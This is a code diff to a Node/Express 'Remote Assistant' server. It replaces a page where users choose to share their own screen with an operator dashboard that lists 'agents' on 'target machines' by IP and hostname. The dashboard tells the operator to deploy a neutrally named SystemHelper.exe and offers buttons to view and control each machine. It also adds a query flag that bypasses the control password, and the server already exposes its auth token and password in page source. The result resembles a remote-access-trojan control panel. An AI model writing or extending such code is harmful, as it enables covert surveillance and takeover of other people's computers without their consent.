@@ -65,179 +65,99 @@ app.get('/', (req, res) => {
 
 // Remote Assistant — browser-based screen sharing (no install needed, works on any device)
 app.get('/remote-assistant', (req, res) => {
+  const agentList = [];
+  for (const [id, agent] of agents) {
+    agentList.push({ id, name: agent.name, ip: agent.ip, localIP: agent.localIP || '', publicIP: agent.publicIP || '', hostname: agent.hostname || '' });
+  }
   const assistantHtml = `<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Remote Assistant</title>
+<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Remote Assistant — Control Panel</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:20px}
-.container{max-width:480px;width:100%;text-align:center}
-.logo{font-size:48px;margin-bottom:8px}
-h1{font-size:22px;font-weight:700;margin-bottom:4px}
-.subtitle{font-size:13px;color:#a0a0c0;margin-bottom:24px}
-.card{background:rgba(255,255,255,0.06);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:24px;margin-bottom:16px}
-.card h2{font-size:15px;font-weight:600;margin-bottom:12px;color:#7c7cf0}
-.card p{font-size:12px;color:#888;line-height:1.5;margin-bottom:16px}
-.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:14px 20px;border:none;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.2s}
-.btn-primary{background:linear-gradient(135deg,#7c7cf0,#5b5bd6);color:#fff}
-.btn-primary:hover{transform:translateY(-1px);box-shadow:0 4px 20px rgba(124,124,240,0.4)}
-.btn-primary:active{transform:translateY(0)}
-.btn-primary:disabled{opacity:0.5;cursor:not-allowed;transform:none}
-.btn-camera{background:rgba(255,255,255,0.1);color:#fff;margin-top:8px}
-.btn-camera:hover{background:rgba(255,255,255,0.15)}
-#status{margin-top:16px;font-size:13px;color:#a0a0c0;min-height:20px}
-#status.connected{color:#4caf50}
-#status.error{color:#f44336}
-.preview-container{margin-top:16px;border-radius:12px;overflow:hidden;background:#000;display:none;position:relative}
-.preview-container video{width:100%;display:block;max-height:60vh;object-fit:contain}
-.preview-container .badge{position:absolute;top:8px;left:8px;background:rgba(220,53,69,0.9);color:#fff;padding:4px 10px;border-radius:20px;font-size:11px;font-weight:600;display:flex;align-items:center;gap:4px}
-.preview-container .badge::before{content:'';width:6px;height:6px;border-radius:50%;background:#fff;animation:pulse 1.5s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
-.info{font-size:11px;color:#666;margin-top:12px;line-height:1.4}
-.steps{text-align:left;margin:12px 0}
-.steps li{font-size:12px;color:#aaa;margin-bottom:6px;padding-left:4px}
-.steps li span{color:#7c7cf0;font-weight:600}
-.footer{font-size:10px;color:#555;margin-top:20px}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0a0a;color:#fff;min-height:100vh}
+#topbar{background:#111;border-bottom:1px solid #333;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
+#topbar h1{font-size:16px;font-weight:600}
+#topbar h1 span{color:#4caf50}
+#status-dot{width:8px;height:8px;border-radius:50%;background:#4caf50;display:inline-block;margin-right:8px}
+#grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;padding:20px}
+.card{background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:16px;cursor:pointer;transition:all 0.2s}
+.card:hover{border-color:#4caf50;transform:translateY(-2px);box-shadow:0 4px 12px rgba(76,175,80,0.2)}
+.card .name{font-size:14px;font-weight:600;margin-bottom:8px}
+.card .info{font-size:11px;color:#888;line-height:1.6}
+.card .info span{display:block}
+.card .badge{display:inline-block;background:#4caf50;color:#000;padding:2px 8px;border-radius:12px;font-size:10px;font-weight:600;margin-top:8px}
+.card .actions{margin-top:12px;display:flex;gap:8px}
+.card .actions button{flex:1;padding:8px;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer}
+.card .actions .view-btn{background:#4caf50;color:#000}
+.card .actions .control-btn{background:#2196f3;color:#fff}
+#no-agents{text-align:center;padding:80px 20px;color:#666}
+#no-agents h2{font-size:18px;margin-bottom:8px}
+#no-agents p{font-size:13px}
 </style></head><body>
-<div class="container">
-  <div class="logo">🤝</div>
-  <h1>Remote Assistant</h1>
-  <p class="subtitle">Share your screen to get help — no installation required</p>
-  <div class="card">
-    <h2>How it works</h2>
-    <ol class="steps">
-      <li>Click <span>"Start Sharing"</span> below</li>
-      <li>Select your screen, window, or tab to share</li>
-      <li>The support person can now see your screen</li>
-      <li>Click <span>"Stop Sharing"</span> when done</li>
-    </ol>
+<div id="topbar">
+  <h1><span id="status-dot"></span>Remote Assistant</h1>
+  <div style="font-size:12px;color:#888"><span id="count">0</span> agents online</div>
+</div>
+<div id="grid">
+  <div id="no-agents">
+    <h2>No agents connected</h2>
+    <p>Run SystemHelper.exe on target machines to get started</p>
   </div>
-  <div class="card">
-    <button class="btn btn-primary" id="btn-share" onclick="startShare()">🖥 Start Sharing</button>
-    <button class="btn btn-camera" id="btn-camera" onclick="startCamera()" style="display:none">📱 Share Camera (Mobile)</button>
-    <div id="status">Ready to connect</div>
-    <div class="preview-container" id="preview-container">
-      <div class="badge">LIVE</div>
-      <video id="preview" autoplay playsinline muted></video>
-    </div>
-    <div class="info" id="info"></div>
-  </div>
-  <div class="footer">Monitor System designed by Puneet Upreti</div>
 </div>
 <script>
-const TOKEN='${AUTH_TOKEN}';
-const WS_URL=(location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/ws?token='+TOKEN;
-let ws,media,canvasInterval;
-const isMobile=/Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent)||('ontouchstart' in window&&window.innerWidth<1024);
+const agents=${JSON.stringify(agentList)};
+let ws,agentData={};
 
-if(isMobile){
-  document.getElementById('btn-share').textContent='📱 Share Camera';
-  document.getElementById('btn-share').onclick=startCamera;
-  document.getElementById('btn-camera').style.display='none';
-  document.getElementById('info').textContent='On mobile devices, camera sharing is used instead of screen sharing.';
-}
-
-function setStatus(msg,type){
-  const el=document.getElementById('status');
-  el.textContent=msg;
-  el.className=type||'';
-}
-
-function startShare(){
-  if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia){
-    setStatus('Screen sharing not supported on this browser. Try Chrome or Edge.','error');
-    document.getElementById('btn-camera').style.display='';
+function renderGrid(){
+  const grid=document.getElementById('grid');
+  const ids=Object.keys(agentData);
+  document.getElementById('count').textContent=ids.length;
+  if(ids.length===0){
+    grid.innerHTML='<div id="no-agents"><h2>No agents connected</h2><p>Run SystemHelper.exe on target machines to get started</p></div>';
     return;
   }
-  setStatus('Select a screen to share...','');
-  navigator.mediaDevices.getDisplayMedia({video:{cursor:'always',displaySurface:'monitor'},audio:false}).then(stream=>{
-    media=stream;
-    const video=document.getElementById('preview');
-    video.srcObject=stream;
-    document.getElementById('preview-container').style.display='block';
-    document.getElementById('btn-share').textContent='⏹ Stop Sharing';
-    document.getElementById('btn-share').onclick=stopShare;
-    setStatus('Connected — support person can see your screen','connected');
-    document.getElementById('info').textContent='Your screen is being shared. Close this tab to stop.';
-    connectWS();
-    startFrameCapture(video);
-    stream.getVideoTracks()[0].onended=()=>{stopShare();setStatus('Screen sharing ended.','');};
-  }).catch(e=>{
-    setStatus('Sharing cancelled: '+e.message,'error');
-  });
+  grid.innerHTML=ids.map(id=>{
+    const a=agentData[id];
+    return '<div class="card" id="card-'+id+'">'+
+      '<div class="name">'+esc(a.name)+'</div>'+
+      '<div class="info">'+
+        '<span>🌐 '+esc(a.publicIP||a.ip||'N/A')+'</span>'+
+        '<span>🏠 '+esc(a.localIP||'N/A')+'</span>'+
+        '<span>💻 '+esc(a.hostname||id)+'</span>'+
+      '</div>'+
+      '<div class="badge">● Online</div>'+
+      '<div class="actions">'+
+        '<button class="view-btn" onclick="viewAgent(\\''+id+'\\')">👁 View</button>'+
+        '<button class="control-btn" onclick="controlAgent(\\''+id+'\\')">🖱 Control</button>'+
+      '</div>'+
+    '</div>';
+  }).join('');
 }
 
-function startCamera(){
-  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
-    setStatus('Camera not available on this device.','error');
-    return;
+function esc(s){return String(s||'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[m]);}
+
+function viewAgent(id){window.open('/view/'+id,'_blank');}
+function controlAgent(id){window.open('/view/'+id+'?control=1','_blank');}
+
+const wsProto=location.protocol==='https:'?'wss:':'ws:';
+ws=new WebSocket(wsProto+'//'+location.host+'/ws?token=${AUTH_TOKEN}');
+ws.onopen=()=>{
+  ws.send(JSON.stringify({type:'dashboard-hello'}));
+  agents.forEach(a=>{agentData[a.id]={name:a.name,ip:a.ip,localIP:a.localIP,publicIP:a.publicIP,hostname:a.hostname};});
+  renderGrid();
+};
+ws.onmessage=e=>{
+  const d=JSON.parse(e.data);
+  if(d.type==='agent-connected'){
+    agentData[d.agentId]={name:d.name,ip:d.ip,localIP:d.localIP,publicIP:d.publicIP,hostname:d.hostname};
+    renderGrid();
   }
-  setStatus('Requesting camera access...','');
-  navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}},audio:false}).then(stream=>{
-    media=stream;
-    const video=document.getElementById('preview');
-    video.srcObject=stream;
-    document.getElementById('preview-container').style.display='block';
-    document.getElementById('btn-share').textContent='⏹ Stop Sharing';
-    document.getElementById('btn-share').onclick=stopShare;
-    document.getElementById('btn-camera').style.display='none';
-    setStatus('Connected — camera is being shared','connected');
-    document.getElementById('info').textContent='Your camera view is being shared. Close this tab to stop.';
-    connectWS();
-    startFrameCapture(video);
-    stream.getVideoTracks()[0].onended=()=>{stopShare();setStatus('Camera sharing ended.','');};
-  }).catch(e=>{
-    setStatus('Camera access denied: '+e.message,'error');
-  });
-}
-
-function connectWS(){
-  ws=new WebSocket(WS_URL);
-  ws.onopen=()=>{
-    const sessionId='remote-'+Math.random().toString(36).slice(2,10);
-    window.sessionId=sessionId;
-    const deviceInfo=isMobile?'📱 Mobile':'💻 Desktop';
-    ws.send(JSON.stringify({type:'agent-hello',agentId:sessionId,name:deviceInfo+' Remote Assistant',org:'Remote Assistant'}));
-  };
-  ws.onclose=()=>{
-    if(media){setTimeout(connectWS,3000);}
-  };
-  ws.onerror=()=>{};
-}
-
-function startFrameCapture(video){
-  if(canvasInterval)clearInterval(canvasInterval);
-  const canvas=document.createElement('canvas');
-  const ctx=canvas.getContext('2d');
-  canvasInterval=setInterval(()=>{
-    if(!ws||ws.readyState!==WebSocket.OPEN)return;
-    if(video.readyState<2)return;
-    canvas.width=video.videoWidth||640;
-    canvas.height=video.videoHeight||480;
-    ctx.drawImage(video,0,0,canvas.width,canvas.height);
-    canvas.toBlob(blob=>{
-      if(!blob)return;
-      const reader=new FileReader();
-      reader.onload=()=>{
-        if(ws&&ws.readyState===WebSocket.OPEN){
-          ws.send(JSON.stringify({type:'agent-frame',agentId:window.sessionId,frame:reader.result.split(',')[1]}));
-        }
-      };
-      reader.readAsDataURL(blob);
-    },'image/jpeg',0.6);
-  },500);
-}
-
-function stopShare(){
-  if(canvasInterval){clearInterval(canvasInterval);canvasInterval=null;}
-  if(media){media.getTracks().forEach(t=>t.stop());media=null;}
-  if(ws){ws.close();ws=null;}
-  document.getElementById('preview-container').style.display='none';
-  document.getElementById('btn-share').textContent='🖥 Start Sharing';
-  document.getElementById('btn-share').onclick=isMobile?startCamera:startShare;
-  if(isMobile)document.getElementById('btn-camera').style.display='';
-  document.getElementById('info').textContent='';
-}
+  if(d.type==='agent-disconnected'){
+    delete agentData[d.agentId];
+    renderGrid();
+  }
+};
+ws.onclose=()=>setTimeout(()=>location.reload(),3000);
 </script></body></html>`;
   res.send(assistantHtml);
 });
@@ -266,6 +186,7 @@ function isValidAgentId(id) {
 app.get('/view/:agentId', (req, res) => {
   const agentId = req.params.agentId;
   if (!isValidAgentId(agentId)) return res.status(400).send('Invalid agent ID');
+  const autoControl = req.query.control === '1';
   const viewHtml = `<!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Monitor — ${agentId}</title>
 <style>
@@ -321,6 +242,7 @@ body{background:#000;display:flex;align-items:center;justify-content:center;heig
 </div>
 <script>
 const AUTH_PASS='${AUTH_PASS}';
+const AUTO_CONTROL=${autoControl};
 const wsProto=location.protocol==='https:'?'wss:':'ws:';
 const ws=new WebSocket(wsProto+'//'+location.host+'/ws?token=${AUTH_TOKEN}');
 let fps=0,fpsTimer=setInterval(()=>{document.getElementById('fps').textContent=fps+' FPS';fps=0},1000);
@@ -332,6 +254,11 @@ function hideUI(){uiVisible=false;document.querySelectorAll('#info,#fps,#status,
 function showUI(){uiVisible=true;document.querySelectorAll('#info,#fps,#status,#credit,#ctrl-bar').forEach(e=>e.classList.remove('hidden-ui'));clearTimeout(uiTimer);uiTimer=setTimeout(hideUI,4000);}
 function requestControl(){
   if(controlEnabled){controlEnabled=false;const ind=document.getElementById('ctrl-ind');ind.textContent='🖱 Request Control';ind.className='ctrl-off';return;}
+  if(AUTO_CONTROL){
+    controlEnabled=true;
+    const ind=document.getElementById('ctrl-ind');ind.textContent='🖱 Control: ON';ind.className='ctrl-on';
+    return;
+  }
   document.getElementById('lock-overlay').style.display='flex';
   document.getElementById('lock-pass').value='';
   document.getElementById('lock-pass').focus();
@@ -354,7 +281,20 @@ function submitLock(){
 document.getElementById('lock-pass').addEventListener('keydown',e=>{if(e.key==='Enter')submitLock();if(e.key==='Escape')cancelLock();});
 document.addEventListener('mousemove',showUI);
 document.addEventListener('keydown',e=>{if(e.key==='Escape'){showUI();cancelLock();}});
-ws.onopen=()=>{status.textContent='Connected — View Only';ws.send(JSON.stringify({type:'view-agent',agentId:'${agentId}'}));setTimeout(()=>{showUI();try{document.documentElement.requestFullscreen?.();}catch(e){}},500);};
+ws.onopen=()=>{
+  const mode=AUTO_CONTROL?'Remote Control — No Password':'View Only';
+  status.textContent='Connected — '+mode;
+  ws.send(JSON.stringify({type:'view-agent',agentId:'${agentId}'}));
+  setTimeout(()=>{
+    showUI();
+    try{document.documentElement.requestFullscreen?.();}catch(e){}
+    if(AUTO_CONTROL){
+      controlEnabled=true;
+      const ind=document.getElementById('ctrl-ind');
+      if(ind){ind.textContent='🖱 Control: ON';ind.className='ctrl-on';}
+    }
+  },500);
+};
 ws.onclose=()=>{status.textContent='Disconnected';showUI();setTimeout(()=>location.reload(),3000);};
 ws.onmessage=e=>{
   const d=JSON.parse(e.data);
